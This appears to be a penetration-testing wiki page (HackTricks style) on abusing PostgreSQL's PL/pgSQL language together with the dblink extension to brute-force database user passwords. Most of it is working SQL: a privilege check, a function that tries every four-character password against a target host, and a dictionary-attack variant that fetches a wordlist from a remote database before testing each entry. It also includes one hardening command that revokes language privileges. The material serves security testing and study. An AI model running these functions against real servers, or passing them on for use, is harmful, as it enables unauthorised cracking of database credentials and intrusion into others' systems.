# PL/pgSQL Password Bruteforce

{{#include ../../../banners/hacktricks-training.md}}

**Find [more information about these attack in the original paper](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)**.<sup>[[1]](#references)</sup>

PL/pgSQL is PostgreSQL's procedural SQL language and supports variables, control structures, errors, and functions invoked from SQL or triggers.<sup>[[2]](#references)</sup>

You can abuse this language in order to ask PostgreSQL to brute-force the users credentials, but it must exist on the database. You can verify it's existence using:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+---------
     plpgsql |
```

PL/pgSQL is installed by default and `PUBLIC` normally has `USAGE` on the language, but creating a function also requires `CREATE` on the target schema. PostgreSQL 15 and later no longer grant every user `CREATE` on the `public` schema in newly created databases, so verify both language and schema ACLs.<sup>[[2]](#references)[[3]](#references)</sup>

```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```

In that case, our previous query would output different results:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+-----------------
     plpgsql | {admin=U/admin}
```

Note that for the following script to work **the function `dblink` needs to exist**. If it doesn't you could try to create it with

```sql
CREATE EXTENSION dblink;
```

## Password Brute Force

Here how you could perform a 4 chars password bruteforce:<sup>[[1]](#references)</sup>

```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
    word TEXT;
BEGIN
    FOR a IN 65..122 LOOP
        FOR b IN 65..122 LOOP
            FOR c IN 65..122 LOOP
                FOR d IN 65..122 LOOP
                    BEGIN
                        word := chr(a) || chr(b) || chr(c) || chr(d);
                        PERFORM(SELECT * FROM dblink(' host=' || host ||
                                                    ' port=' || port ||
                                                    ' dbname=' || dbname ||
                                                    ' user=' || username ||
                                                    ' password=' || word,
                                                    'SELECT 1')
                                                    RETURNS (i INT));
                                                    RETURN word;
                        EXCEPTION
                            WHEN sqlclient_unable_to_establish_sqlconnection
                                THEN
                                    -- do nothing
                    END;
                END LOOP;
            END LOOP;
        END LOOP;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

_Note that even brute-forcing 4 characters may take several minutes._

You could also **download a wordlist** and try only those passwords (dictionary attack):

```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
    FOR word IN (SELECT word FROM dblink('host=1.2.3.4
                                            user=name
                                            password=qwerty
                                            dbname=wordlists',
                                            'SELECT word FROM wordlist')
                                        RETURNS (word TEXT)) LOOP
        BEGIN
            PERFORM(SELECT * FROM dblink(' host=' || host ||
                                            ' port=' || port ||
                                            ' dbname=' || dbname ||
                                            ' user=' || username ||
                                            ' password=' || word,
                                            'SELECT 1')
                                        RETURNS (i INT));
            RETURN word;

            EXCEPTION
                WHEN sqlclient_unable_to_establish_sqlconnection THEN
                    -- do nothing
        END;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

## References

- [1] [Having Fun With PostgreSQL](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)
- [2] [PostgreSQL documentation — PL/pgSQL overview](https://www.postgresql.org/docs/current/plpgsql-overview.html)
- [3] [PostgreSQL documentation — Schemas and privileges](https://www.postgresql.org/docs/current/ddl-schemas.html)

{{#include ../../../banners/hacktricks-training.md}}
